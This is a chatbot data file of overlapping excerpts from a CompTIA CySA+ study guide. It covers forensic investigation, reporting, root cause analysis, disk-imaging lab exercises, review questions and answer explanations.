rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	techniques, it is likely that they applied them with some degree of success. A visit to the antiforensic techniques page, as well as searches for data that was deleted or otherwise hidden, is needed. Some of this additional information can be gathered by reviewing data cached by Windows, including install information from the local user directories. Since the sample image is a Windows machine, install information resides in C:\Users\<username>\AppData\ Local\Temp. Checking there shows that iCloud was installed in the middle of the timeframe that email communications were occurring, as shown in Figure 13.15. FTK also indexes and displays deleted files, allowing you to see that CCleaner, a system cleanup program that removes browser history and cache and wipes other information useful for forensic investigations, was removed from the system in Figure 13.16, and that Eraser, a file wiping utility, appears to have been partially deleted but left a remnant directory in the Program Files folder. Both of these utilities are likely to be found as part of an antiforensic attempt, providing further evidence of the user’s intention to delete evidence. 476 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response F I G U R E 13 . 14 Web search history F I G U R E 13 . 15 iCloud setup log with timestamp Forensic Investigation: An Example F I G U R E 13 . 16 477 CCleaner remnant data via the Index Search function At the end of the timeline for the informant in our case, a resignation letter is created and printed. This can be found easily using a timeline of events on the system, or as part of a manual file review using the indexed list of files and searching for Microsoft Office documents, as shown in Figure 13.17 and Figure 13.18. F I G U R E 1 3 . 17 Document type sorting 478 Chapter 13 F I G U R E 13 . 18 ■ Performing Forensic Analysis and Techniques for Incident Response Resignation letter found based on document type. Source: Condé Nast www.wired.com/images_blogs/threatlevel/2012/03/celiginvestigation.pdf / last accessed February 11, 2023. Reporting The final stage of forensic investigation is preparing and presenting a report. Reports should include three major components: the goals and scope of the investigation; the target or targets of the forensic activities, including all systems, devices, and media; and a complete listing of the findings and results. Goals of the Investigation This section of your report should include the goals of the investigation, including the initial scope statement for the forensic activities. This section will also typically include information about the person or organization that asked for the investigation. An example of a statement of the goals of an investigation is “John Smith, the Director of Human Resources, requested that we review Alice Potter’s workstation, email, and the systems she administers to ensure that the data that was recently leaked to a competitor was not sent from her email account or workstation.” Targets The report you create
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Goals of the Investigation This section of your report should include the goals of the investigation, including the initial scope statement for the forensic activities. This section will also typically include information about the person or organization that asked for the investigation. An example of a statement of the goals of an investigation is “John Smith, the Director of Human Resources, requested that we review Alice Potter’s workstation, email, and the systems she administers to ensure that the data that was recently leaked to a competitor was not sent from her email account or workstation.” Targets The report you create should include a list of all the devices, systems, and media that was captured and analyzed. Targets should all be listed in your tracking notes and chain of custody forms if you are using them. The same level of detail used to record the system or device should be used in this listing. A sample entry might read: Forensic Investigation: An Example 479 Alice Potter’s workstation, internal inventory number 6108, Lenovo W540 laptop, with Samsung SSD serial number S12KMFBD644850, item number 344 If large numbers of devices or systems were inspected, the full listing of targets is often moved to an appendix, and the listing of what was reviewed will list a high-­level overview of systems, applications, devices, and other media, with a reference to the appendix for full detail. Findings and Analysis Findings are the most critical part of the document and should list what was discovered, how it was discovered, and why it is important. The Stroz Friedberg forensic investigation conducted as part of a contract dispute about the ownership of Facebook provides an example of the detail needed in forensic findings. While the report is now dated, many of the same forensic artifacts and concepts still show up—­although floppy disks have been replaced with flash media and cloud storage! Wired provided the full Stroz Friedberg forensic report from the public record for the case, and you can find it at www.wired.com/images_ blogs/threatlevel/2012/03/celiginvestigation.pdf. Root Cause Analysis The process of root cause analysis (RCA) is used to identify why a problem, incident, or issue occurred. Root cause analysis is performed to allow organizations to understand what they need to focus on to prevent future problems as well as to ensure that the current problem does not become worse. Root cause analysis procedures vary from organization to organization, but a handful of typical steps are involved in most RCA processes: ■■ ■■ ■■ Defining the event or incident that is going to be analyzed Identifying the causes or contributing factors to the event, including building a timeline or process flow Finding the underlying, or root cause, often by mapping each identified cause or effect and asking what led to it ■■ Identifying solutions to the root cause ■■ Implementing controls, fixes, or other changes to address the root cause ■■ Validating the fixes have been effective ■■ Reporting Root cause analyses can be challenging for a number of reasons, such
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	handful of typical steps are involved in most RCA processes: ■■ ■■ ■■ Defining the event or incident that is going to be analyzed Identifying the causes or contributing factors to the event, including building a timeline or process flow Finding the underlying, or root cause, often by mapping each identified cause or effect and asking what led to it ■■ Identifying solutions to the root cause ■■ Implementing controls, fixes, or other changes to address the root cause ■■ Validating the fixes have been effective ■■ Reporting Root cause analyses can be challenging for a number of reasons, such as if the root cause is hard to identify, if what appears to be the root cause may not be the actual root cause, and if there may be multiple root causes. 480 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response You’ll notice that there’s no analysis of costs or benefits listed in the RCA process. That doesn’t mean it won’t happen! In fact, an analysis typically happens after potential solutions have been identified and before they’re implemented. That’s where disciplines like risk assessment and cost– benefit calculations come into play in most organizations. Lessons Learned Once incident response has been completed, the final stage of post-­incident activity is to identify lessons learned. These are the take-­aways from the incident, including opportunities for improvement, new controls or practices that need to be implemented, and process or procedure changes that should be made. Lessons learned can include a wide variety of feedback. They are used to drive the preparation phase of pre-­incident work going forward. You may be familiar with project management lessons learned documents that ask participants what went well, what didn’t go well, and what needs improvement. Similar templates can be helpful when conducting lessons learned efforts for incidents as well. Summary Cybersecurity analysts need to understand the tools, techniques, and processes required to acquire evidence and perform forensic analysis. Forensics toolkits are typically built around powerful forensic workstations that may run a purpose-­built forensic investigation suite or may provide individual forensic utilities and tools. Toolkits also often include write blockers, forensic duplicators, media, and documentation equipment and supplies. Specialized tools exist for mobile device forensics, law enforcement, and other types of specific forensic investigations. Forensic software provides the ability to image and analyze systems, carve filesystems, and acquire data from various types of drives and devices. It also often supports important forensic functions, allowing analysts to maintain chain of custody documentation to provide who had access to an image and what was done with it. Hashing and validating data integrity are also critical to prove that forensic images match the original. Legal holds require data preservation, and data may also be preserved as part of organizational processes or as part of investigations. The forensic process includes identifying targets, conducting acquisition and validating that the images match, analysis, and reporting. A host of specific tools, techniques, file locations, and other elements come together as part of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	devices. It also often supports important forensic functions, allowing analysts to maintain chain of custody documentation to provide who had access to an image and what was done with it. Hashing and validating data integrity are also critical to prove that forensic images match the original. Legal holds require data preservation, and data may also be preserved as part of organizational processes or as part of investigations. The forensic process includes identifying targets, conducting acquisition and validating that the images match, analysis, and reporting. A host of specific tools, techniques, file locations, and other elements come together as part of an investigation to create a complete forensic case. In the end, a forensic report must include the goals of the investigation, the Lab Exercises 481 targets, a listing of what was found, and careful analysis of what that data means. Incident-­ related forensic processes typically include a root cause analysis that describes why the event or issue happened, and lessons learned to help the organization improve and avoid having the same or related problems in the future. Exam Essentials Explain evidence acquisition tools, processes, and procedures. Understand how and why evidence is acquired. Explain chain of custody and why it must be documented and preserved. Describe legal holds and preservation activities, what they are and when they may be required. Understand forensic analysis, including tools, processes and procedures needed to successfully acquire and analyze forensic data. Be familiar with what’s involved in a forensic investigation. Describe forensic investigation processes, including scoping, identifying locations of relevant data, planning, acquisition, analysis, and reporting. Understand forensic targets, including system information, file modification, access, and other commonly acquired forensic data. Explain why acquisition requires forensic validation and care to not modify the source data, including the use of write blockers, as well as validating data integrity via hashing. Describe post-­incident activity. Explain how and why forensic analysis may be used as part of an incident. Explain root cause analysis and lessons learned, when they occur, and what information they typically contain. Lab Exercises Activity 13.1: Create a Disk Image In this exercise you will use dd to create a disk image and then verify the checksum of the image. Part 1: Boot a Kali Linux system and mount a drive 1. Start your Kali Linux virtual machine. 2. Select a USB thumb drive that is formatted as FAT32 to make an image of for this practice session. A smaller drive will be faster to image, and you should make sure you image a drive smaller than the space you have available for your Kali Linux system. 3. From the Devices menu for the running Kali virtual machine, choose USB and then the drive you have inserted. The device should now show up on your Kali Linux desktop. 4. Verify that you can navigate to the drive from the command line. Open a terminal window, then navigate to /dev/disk/by-­label, and make sure you see the name of the thumb drive you have mounted. 482 Chapter
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	this practice session. A smaller drive will be faster to image, and you should make sure you image a drive smaller than the space you have available for your Kali Linux system. 3. From the Devices menu for the running Kali virtual machine, choose USB and then the drive you have inserted. The device should now show up on your Kali Linux desktop. 4. Verify that you can navigate to the drive from the command line. Open a terminal window, then navigate to /dev/disk/by-­label, and make sure you see the name of the thumb drive you have mounted. 482 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Part 2: Clone the drive 1. Create a temporary working directory for your volume by running the following command in your terminal window: mkdir ~/tmp This command will create a directory called tmp in your home directory. 2. Create an MD5 checksum of the volume you intend to clone in your home directory: md5sum /dev/disk/by-­ label/[label of your drive]> ~/exercise7_1_original.md5 3. Clone the volume or disk: dd if=/dev/disk/by-­ label/[label of your drive] of=~/tmp/exercise7_1_disk .img bs=64k 4. Once this completes, verify the integrity of the image using MD5: md5sum ~/tmp/exercise7_1_disk.img> ~/exercise7_1_clone.md5 5. Now compare the MD5 files. You can do that by using the more command to view the files, or you can record the values here: __________________________________________ __________________________________________ The values should be the same if your clone was successful. Activity 13.2: Conduct the NIST Rhino Hunt The National Institute of Standards and Technology provides a set of practice forensic images that can be freely downloaded and used to hone your forensic skills. You can find the full set at www.cfreds.nist.gov. For this exercise we will use the Rhino hunt scenario as well as the SANS SIFT image available from http://digital-­forensics.sans.org/ community/downloads. 1. Run SIFT. If you prefer VMware, you can run it directly; otherwise, use the import tool to import it into VirtualBox. (If you import the VM into VirtualBox, you will need to run sudo apt-­get install virtualbox-­guest-­dkms and then reboot to get a useful screen resolution.) 2. Log in using the default username with the password forensics. 3. Download the SANS Rhino hunt: wget http://www.cfreds.nist.gov/dfrws/DFRWS2005-­RODEO.zip 4. Unzip the Rhino hunt: unzip DFRWS2005-­RODEO.zip 5. Use SIFT to find the rhino pictures. Lab Exercises 6. Mount the file: sudo mount -­ o loop, ro RHINOUSB.dd /mnt/usb 7. Review the contents of the mount: ls /mnt/usb Note that you will see only two recipes for gumbo. Something was done to this drive that overwrote the original contents, and they need to be recovered! Next we will recover deleted files using foremost, a utility that automatically recovers files based on file headers and other information. 8. Create a directory for the output: mkdir output 9. Run foremost against the RHINOUSB image: foremost -­ o output/ RHINOUSB.dd 10. Review the output. To open the file you have recovered, click the filing cabinet icon at the top left of the screen, navigate to Home
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of the mount: ls /mnt/usb Note that you will see only two recipes for gumbo. Something was done to this drive that overwrote the original contents, and they need to be recovered! Next we will recover deleted files using foremost, a utility that automatically recovers files based on file headers and other information. 8. Create a directory for the output: mkdir output 9. Run foremost against the RHINOUSB image: foremost -­ o output/ RHINOUSB.dd 10. Review the output. To open the file you have recovered, click the filing cabinet icon at the top left of the screen, navigate to Home ➢ Output ➢ Doc, and then double-­click the DOC file you recovered. Read to the end of the file to determine what happened to the hard drive. Once you know where the hard drive went, you are done with this exercise. The Rhino hunt has a lot more to it, so feel free to continue based on the NIST page’s instructions. Activity 13.3: Identifying Security Tools Match each of the following tools to the correct description: dd A memory forensics and analysis suite md5sum A GUI network traffic sniffer Volatility Framework A device used to prevent forensic software from modifying a drive while accessing it FTK Used to validate whether a drive copy is forensically sound Eraser A Linux tool used to create disk images Write blocker A command-­line network packet sniffer WinDbg A full-­featured forensic suite Forensic drive duplicator A tool used to review Windows memory dumps Wireshark A drive and file wiping utility sometimes used for antiforensic purposes tcpdump A device designed to create a complete forensic image and validate it without a PC 483 Chapter 13 484 ■ Performing Forensic Analysis and Techniques for Incident Response Review Questions 1. 2. 3. 4. 5. 6. Which format does dd produce files in while disk imaging? A. ddf B. RAW C. EN01 D. OVF Gurvinder has completed his root cause analysis and wants to use it to avoid future problems. What should he document next? A. Lessons learned B. The system architecture diagram C. An updated forensic process D. Current legal holds Mike is conducting a root cause analysis. Which of the following is not a typical phase in the root cause analysis process? A. Identifying contributing factors B. Identifying solutions to the root cause C. Performing a risk analysis D. Implementing controls or fixes to address the root cause Alice wants to copy a drive without any chance of it being modified by the copying process. What type of device should she use to ensure that this does not happen during her data acquisition process? A. A read blocker B. A drive cloner C. A write blocker D. A hash validator Frederick’s organization has been informed that data must be preserved due to pending legal action. What is this type of requirement called? A. A retainer B. A legal hold C. A data freeze D. An extra-­legal hold What process is often performed as part of incident response
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	cause Alice wants to copy a drive without any chance of it being modified by the copying process. What type of device should she use to ensure that this does not happen during her data acquisition process? A. A read blocker B. A drive cloner C. A write blocker D. A hash validator Frederick’s organization has been informed that data must be preserved due to pending legal action. What is this type of requirement called? A. A retainer B. A legal hold C. A data freeze D. An extra-­legal hold What process is often performed as part of incident response forensic analysis? A. Blame assignment B. Root cause analysis C. Reverse hashing D. Legal holds Review Questions 7. 8. Jeff is investigating a system compromise and knows that the first event was reported on October 5. What forensic tool capability should he use to map other events found in logs and files to this date? A. A timeline B. A log viewer C. Registry analysis D. Timestamp validator During her forensic copy validation process, Danielle hashed the original, cloned the image files, and received the following MD5 sums. What is likely wrong? b49794e007e909c00a51ae208cacb169 d9ff8a0cf6bc0ab066b6416e7e7abf35 9. 485 original.img clone.img A. The original was modified. B. The clone was modified. C. dd failed. D. An unknown change or problem occurred. Jennifer wants to perform memory analysis and forensics for Windows, macOS, and Linux systems. Which of the following is best suited to her needs? A. LiME B. DumpIt C. fmem D. The Volatility Framework 10. As part of her review of a forensic process, Lisa is reviewing a log that lists each time a person handled a forensic image. She notices that an entry lists forensic analysis actions but does not have a name logged. What concept does this violate? A. Image integrity B. Forensic authenticity C. Preservation D. Chain of custody 11. Why is validating data integrity critical to forensic processes? A. It ensures the system has not been compromised. B. It ensures the system has not been altered by the forensic examiner. C. It ensures the operating system version matches the expected version. D. It is required by the legal hold process. Chapter 13 486 ■ Performing Forensic Analysis and Techniques for Incident Response 12. Carl does not have the ability to capture data from a cell phone using mobile forensic or imaging software, and the phone does not have removable storage. Fortunately, the phone was not set up with a PIN or screen lock. What is his best option to ensure he can see email and other data stored there? A. Physical acquisition B. Logical access C. Filesystem access D. Manual access 13. What forensic issue might the presence of a program like CCleaner indicate? A. Antiforensic activities B. Full disk encryption C. Malware packing D. MAC time modifications 14. Which of the following is not a potential issue with live imaging of a system? A. Remnant data from the imaging tool will remain. B. Unallocated space will be
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	removable storage. Fortunately, the phone was not set up with a PIN or screen lock. What is his best option to ensure he can see email and other data stored there? A. Physical acquisition B. Logical access C. Filesystem access D. Manual access 13. What forensic issue might the presence of a program like CCleaner indicate? A. Antiforensic activities B. Full disk encryption C. Malware packing D. MAC time modifications 14. Which of the following is not a potential issue with live imaging of a system? A. Remnant data from the imaging tool will remain. B. Unallocated space will be captured. C. Memory or drive contents may change during the imaging process. D. Malware may detect the imaging tool and work to avoid it. 15. During his investigation, Jeff, a certified forensic examiner, is provided with a drive image created by an IT staff member and is asked to add it to his forensic case. What is the most important issue that Jeff could encounter if the case goes to court and his procedures are questioned? A. Bad checksums B. Hash mismatch C. Antiforensic activities D. Inability to certify chain of custody 16. Jeff is investigating a system that is running malware that he believes encrypts its data on the drive. What process should he use to have the best chance of viewing that data in an unencrypted form? A. Live imaging B. Offline imaging C. Brute-­force encryption cracking D. Causing a system crash and analyzing the memory dump 17. Susan needs to capture network traffic from a Linux server that does not use a GUI. What packet capture utility is found on many Linux systems and works from the command line? A. tcpdump B. netdd C. Wireshark D. Snifman Review Questions 487 18. During a forensic investigation, Ben asks Chris to sit with him and to sign off on the actions he has taken. What is he doing? A. Maintaining chain of custody B. Over-­the-­shoulder validation C. Pair forensics D. Separation of duties 19. Which tool is not commonly used to generate the hash of a forensic copy? A. MD5 B. FTK C. SHA1 D. AES 20. Which of the following issues makes both cloud and virtualized environments more difficult to perform forensics on? A. Other organizations manage them. B. Systems may be ephemeral. C. No forensic tools work in both environments. D. Drive images cannot be verified. Appendix Answers to Review Questions 490 Appendix ■ Answers to Review Questions Chapter 2: System and Network Architecture 1. C. Naomi should containerize her application. This will provide her with a lightweight option that can be moved between services and environments without requiring her to have an OS included in her container. Virtualization would include a full operating system. SASE is a solution for edge-focused security, whereas x86 is a hardware architecture. 2. D. The built-­in Windows Registry editor is regedit. The secpol.msc tool is used to view and manage security policies. There is no regwiz tool, and Notepad, while handy,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Answers to Review Questions 490 Appendix ■ Answers to Review Questions Chapter 2: System and Network Architecture 1. C. Naomi should containerize her application. This will provide her with a lightweight option that can be moved between services and environments without requiring her to have an OS included in her container. Virtualization would include a full operating system. SASE is a solution for edge-focused security, whereas x86 is a hardware architecture. 2. D. The built-­in Windows Registry editor is regedit. The secpol.msc tool is used to view and manage security policies. There is no regwiz tool, and Notepad, while handy, shouldn’t be used to try to edit the Registry!. 3. D. Tom knows that log level 7 provides debugging messages that he will need during troubleshooting. Once he’s done, he’ll likely want to set a lower log level to ensure that he doesn’t create lots of noise in his logs. 4. C. Segmentation is sometimes used to increase availability by reducing the potential impact of an attack or issue—­intentionally reducing availability is unlikely to be a path chosen by most organizations. 5. A. Ric knows that zero trust can be complex to implement. Zero trust does not specifically prevent TLS inspection or conflict with SDN, and a successful zero trust implementation needs to validate user permissions but allow them to do their jobs. 6. B. Michelle’s security token is an example of a possession factor, or “something you have.” A password or PIN would be a knowledge factor or “something you know,” and a fingerprint or retina scan would be a biometric, or inherence, factor. 7. C. Identity providers (IDPs) make assertions about identities to relying parties and service providers in a federation. CDUs and APs are not terms used in federated identity designs. 8. B. Zero trust requires each action or use of privileges to be validated and verified before it is allowed to occur. Secure access service edge combines software-­defined networking with other security products and services to control edge device security rather than requiring a secured central service or network. Trust but verify and extended validation network are not design concepts. 9. A. Juan’s organization is using a single sign-­on (SSO) solution that allows users to sign in once and use multiple services. MFA is multifactor authentication; EDR is endpoint detection and response, an endpoint security tool; and ZeroAuth was made up for this question. 10. C. A privilege access management (PAM) system would not only allow Jen’s organization to manage and monitor privilege use for administrator accounts but would be helpful for other privileges as well. SAML is an XML-­based language used to send authorization and authentication data, a CASB is a cloud access security broker used to manage cloud access rights, and PKI is a public key infrastructure used to issue and manage security certificates. Chapter 2: System and Network Architecture 491 11. C. Common examples of PII include financial records, addresses and phone numbers, and national or state identification numbers like Social Security numbers,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	A privilege access management (PAM) system would not only allow Jen’s organization to manage and monitor privilege use for administrator accounts but would be helpful for other privileges as well. SAML is an XML-­based language used to send authorization and authentication data, a CASB is a cloud access security broker used to manage cloud access rights, and PKI is a public key infrastructure used to issue and manage security certificates. Chapter 2: System and Network Architecture 491 11. C. Common examples of PII include financial records, addresses and phone numbers, and national or state identification numbers like Social Security numbers, passport numbers, and driver’s license numbers in the United States. CHD is cardholder data. PCI is the payment card industry, which defines the PCI DSS security standard. TS/SCI is a U.S. classification label standing for Top Secret/Sensitive Compartmented Information. 12. B. The primary account number (PAN), the cardholder’s name, and the expiration date of the card are considered cardholder data. Sensitive authentication data includes the CVV code, the contents of the magnetic stripe and chip, and the PIN code if one is used. 13. C. The temporary files directory is not a common location for configuration files for programs. Instead, the Registry, ProgramData, and Program Data directories are commonly used to store configuration information. 14. D. A PIN is something you know and thus is a knowledge factor. 15. B. NTP (Network Time Protocol) is the underlying protocol used to ensure that systems are using synchronized time. 16. A. OAuth, OpenID, SAML, and AD FS are all examples of technologies used for federated identity. They aren’t MFA, identity vetting, or PKI technologies. 17. A. Example Corporation is using segmentation, separating different risk or functional groupings. Software-­defined networking is not mentioned, as no code-­based changes or configurations are being made. There is nothing to indicate a single point of failure, and zoned routing was made up for this question—­but the zone routing protocol is a network protocol used to maintain routes in a local network region. 18. C. Sending logs to a remote log server or bastion host is an appropriate compensating control. This ensures that copies of the logs exist in a secure location, allowing them to be reviewed if a similar compromise occurred. Full-­disk encryption leaves files decrypted while in use and would not secure the log files from a compromise, whereas log rotation simply means that logs get changed out when they hit a specific size or time frame. TLS encryption for data (including logs) in transit can keep it private and prevent modification but wouldn’t protect the logs from being deleted. 19. B. Ben knows that hardening processes typically focus on disabling unnecessary services, not enabling additional services. Updating, patching, enabling logging, and configuring security capabilities like disk encryption are all common hardening practices. 20. B. While it may seem like Gabby has implemented three different factors, both a PIN and a passphrase are knowledge-­based factors and cannot be considered distinct factors. She has implemented two distinct
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	changed out when they hit a specific size or time frame. TLS encryption for data (including logs) in transit can keep it private and prevent modification but wouldn’t protect the logs from being deleted. 19. B. Ben knows that hardening processes typically focus on disabling unnecessary services, not enabling additional services. Updating, patching, enabling logging, and configuring security capabilities like disk encryption are all common hardening practices. 20. B. While it may seem like Gabby has implemented three different factors, both a PIN and a passphrase are knowledge-­based factors and cannot be considered distinct factors. She has implemented two distinct factors with her design. If she wanted to add a third factor, she could replace either the password or the PIN with a fingerprint scan or other biometric factor. 492 Appendix ■ Answers to Review Questions Chapter 3: Malicious Activity 1. B. The df command will show you a system’s current disk utilization. Both the top command and the ps command will show you information about processes, CPU, and memory utilization, whereas lsof is a multifunction tool for listing open files. 2. C. Perfmon, or Performance Monitor, provides the ability to gather detailed usage statistics for many items in Windows. Resmon, or Resource Monitor, monitors CPU, memory, and disk usage but does not provide information about things like USB host controllers and other detailed instrumentation. Statmon and winmon are not Windows built-­in tools. 3. D. Flow data provides information about the source and destination IP address, protocol, and total data sent and would provide the detail needed. Syslog, WMI, and resmon data are all system log information and would not provide this information. 4. A. Network access control (NAC) can be set up to require authentication. Port security is limited to recognizing MAC addresses, making it less suited to preventing rogue devices. PRTG is a monitoring tool, and NTP is the Network Time Protocol. 5. A. A monitoring threshold is set to determine when an alarm or report action is taken. Thresholds are often set to specific values or percentages of capacity. 6. B. Chris is most likely reviewing a JSON file. HTML and XML typically use angle brackets (< and >) rather than curly brackets. Plain text does not use or require either. 7. A. Beaconing activity (sometimes called heartbeat traffic) occurs when traffic is sent to a botnet command-and-control system. The other terms are made up. 8. C. Cameron should compare the hashes of the known-­good original and the new file to see if they match. The files are not described as encrypted, so decrypting them won’t help. Strings can show text in binary files but won’t compare the files. File size and creation date are not guarantees of a file being the same. 9. D. Hardware vendor ID codes are part of MAC addresses and can be checked for devices that have not had their MAC address changed. It is possible to change MAC addresses, so relying on only the MAC address is not recommended, but it
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Cameron should compare the hashes of the known-­good original and the new file to see if they match. The files are not described as encrypted, so decrypting them won’t help. Strings can show text in binary files but won’t compare the files. File size and creation date are not guarantees of a file being the same. 9. D. Hardware vendor ID codes are part of MAC addresses and can be checked for devices that have not had their MAC address changed. It is possible to change MAC addresses, so relying on only the MAC address is not recommended, but it can be useful to help identify what a rogue device might be. 10. B. Locating a rogue AP is often best done by performing a physical survey and triangulating the likely location of the device by checking its signal strength. If the AP is plugged into the organization’s network, nmap may be able to find it, but connecting to it is unlikely to provide its location (or be safe!). NAC would help prevent the rogue device from connecting to an organizational network but won’t help locate it. 11. A. Microsoft Configuration Manager provides non-­real-­time reporting for disk space. Resmon, perfmon, and SCOM can all provide real-­time reporting, which can help identify problems before they take a system down. Chapter 4: Threat Intelligence 493 12. A. Obfuscated links take advantage of tricks, including using alternate encodings, typos, and long URLs that contain legitimate links wrapped in longer malicious links. Symbolic links are a pointer used by Linux operating systems to point to an actual file using a filename and link. Phishing links and decoy links are not common terms. 13. B. The syslog file is found in /var/log on most Linux hosts. 14. C. Forwarding an email will remove the headers and replace them with new headers on the forwarded email—­but not the original. Laura should use a “view headers” or “view original email” option if it exists to view and analyze the headers. Printing, replying, or downloading an email will not impact the headers. 15. B. SOAR tools focus on orchestration and response. SIEM tools typically do not focus on automated response. Both leverage log analysis and aggregation and will provide dashboards and reporting. 16. B. The service -­-­status command is a Linux command. Windows service status can be queried using sc, the Services snap-­in for the Microsoft Management Console (MMC), or via a PowerShell query. 17. D. Protocol analysis, using heuristic (behavior)-­based detection capabilities, and building a network traffic baseline are all common techniques used to identify unexpected network traffic. Beaconing occurs when a system contacts a botnet command-and-control (C&C) system, and it is likely to be a source of unexpected traffic. 18. C. SNMP will not typically provide specific information about a system’s network traffic that would allow you to identify outbound connections. Flows, sniffers (protocol analyzers), and an IDS or IPS can all provide a view that would allow the suspect traffic to be captured. 19. A.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	(MMC), or via a PowerShell query. 17. D. Protocol analysis, using heuristic (behavior)-­based detection capabilities, and building a network traffic baseline are all common techniques used to identify unexpected network traffic. Beaconing occurs when a system contacts a botnet command-and-control (C&C) system, and it is likely to be a source of unexpected traffic. 18. C. SNMP will not typically provide specific information about a system’s network traffic that would allow you to identify outbound connections. Flows, sniffers (protocol analyzers), and an IDS or IPS can all provide a view that would allow the suspect traffic to be captured. 19. A. DMARC (Domain-­Based Message Authentication, Reporting, and Conformance) is a protocol that combines SPF and DKIM to prove that a sender is who they claim to be. DKIM validates that a domain is associated with a message, whereas SPF lists the servers that are authorized to send from your domain. POP3 is an email protocol but does not perform the function described. 20. B. The top command in Linux provides an interactive interface to view CPU utilization, memory usage, and other details for running processes. df shows disk usage, tail displays the end of a file, and cpugrep is a made-­up command. Chapter 4: Threat Intelligence 1. B. While higher levels of detail can be useful, it isn’t a common measure used to assess threat intelligence. Instead, the timeliness, accuracy, and relevance of the information are considered critical to determining whether you should use the threat information. 2. C. The lack of complexity and nuance most likely indicates that she has discovered an attack by an unskilled attacker, sometimes called a “script kiddie”. 494 Appendix ■ Answers to Review Questions 3. D. Threat intelligence dissemination or sharing typically follows threat data analysis. The goal is to get the threat data into the hands of the organizations and individuals who need it. 4. A. Understanding what your organization needs is important for the requirements gathering phase of the intelligence cycle. Reviewing recent breaches and compromises can help to define what threats you are currently facing. Current vulnerability scans can identify where you may be vulnerable but are less useful for threat identification. Data handling standards do not provide threat information, and intelligence feed reviews list new threats, but those are useful only if you know what type of threats you’re likely to face so that you can determine which ones you should target. 5. D. The U.S. government created the information sharing and analysis centers (ISACs). ISACs help infrastructure owners and operators share threat information, as well as provide tools and assistance to their members. 6. A. Nation-­state actors are government sponsored and typically have the greatest access to resources, including tools, money, and talent. 7. A. Hacktivists execute attacks for political reasons, including those against governments and businesses. The key element in this question is the political reasons behind the attack. 8. B. Attack vectors, or the means by which an attacker can gain access to their target, can include things
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	target. 5. D. The U.S. government created the information sharing and analysis centers (ISACs). ISACs help infrastructure owners and operators share threat information, as well as provide tools and assistance to their members. 6. A. Nation-­state actors are government sponsored and typically have the greatest access to resources, including tools, money, and talent. 7. A. Hacktivists execute attacks for political reasons, including those against governments and businesses. The key element in this question is the political reasons behind the attack. 8. B. Attack vectors, or the means by which an attacker can gain access to their target, can include things like USB key drops. You may be tempted to answer this question with adversary capability, but remember the definition: the resources, intent, or ability of the likely threat actor. Capability here doesn’t mean what they can do but their ability to do so. The attack surface might include the organization’s parking lot in this example, but this is not an example of an attack surface, and there was no probability assessment included in this problem. 9. A. Behavioral assessments are very useful when you are attempting to identify insider threats. Since insider threats are often hard to distinguish from normal behavior context of the actions performed, such as after-­hours logins, misuse of credentials, and logins from abnormal locations or in abnormal patterns, other behavioral indicators are often used. 10. D. Threat actors like criminal organizations frequently operate via the dark web. Forums operate as clearinghouses for information, resources, and access via TOR-­hosted sites. While social media, blogs, or government bulletins may provide information about a criminal organization, more likely to publish information themselves on the dark web. 11. A. Administrative logins themselves are not IOCs, but unexpected behavior associated with them or other atypical behavior is an indicator of compromise. Unexpected modifications of configuration files, login activity from atypical countries or locations, and large file transfers from administrative systems are all common indicators of compromise. 12. B. Nick should deploy a honeypot to capture attack tools and techniques for further analysis. Firewalls block traffic. A web application firewall is a firewall designed to protect web applications, and while it may capture useful information it is not as well suited to this purpose. A SIEM, or security information and event management tool, may also capture relevant attack data but it’s not specifically designed for the purpose like a honeypot is. Chapter 5: Reconnaissance and Intelligence Gathering 495 13. A. Threat hunters are less likely to look at policies. Instead, configurations and misconfigurations, isolated networks, and business-­critical assets are all common focuses of threat hunters. 14. C. The confidence level of your threat information is how certain you are of the information. A high confidence threat assessment will typically be confirmed either by multiple independent and reliable sources or via direct verification. 15. A. ISACs were introduced in 1998 as part of a presidential directive, and they focus on threat information sharing and analysis for critical infrastructure owners. 16. B. Threat intelligence
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	5: Reconnaissance and Intelligence Gathering 495 13. A. Threat hunters are less likely to look at policies. Instead, configurations and misconfigurations, isolated networks, and business-­critical assets are all common focuses of threat hunters. 14. C. The confidence level of your threat information is how certain you are of the information. A high confidence threat assessment will typically be confirmed either by multiple independent and reliable sources or via direct verification. 15. A. ISACs were introduced in 1998 as part of a presidential directive, and they focus on threat information sharing and analysis for critical infrastructure owners. 16. B. Threat intelligence feeds often provide information about what vulnerabilities are being actively exploited as well as about new exploits. This can influence patching priorities and vulnerability management efforts. Zero-­day threats aren’t known until they are released. Vulnerability management efforts help to determine what patches aren’t installed, but threat intelligence doesn’t determine that. Threat intelligence isn’t directly leveraged for quantitative risk assessment as part of vulnerability management efforts in typical organizations. 17. A. The threat indicators built into OpenIOC are based on Mandiant’s indicator list. You can extend and include additional indicators of compromise beyond the 500 built-­in definitions. 18. B. Advanced persistent threats (APTs) are most commonly associated with nation-­state actors. The complexity of their operations and the advanced tools that they bring typically require significant resources to leverage fully. 19. D. Insider threats may be intentional or unintentional. 20. C. Forensic data is very helpful when defining indicators of compromise (IOCs). Behavioral threat assessments can also be partially defined by forensic data, but the key here is where the data is most frequently used. Chapter 5: Reconnaissance and Intelligence Gathering 1. D. The 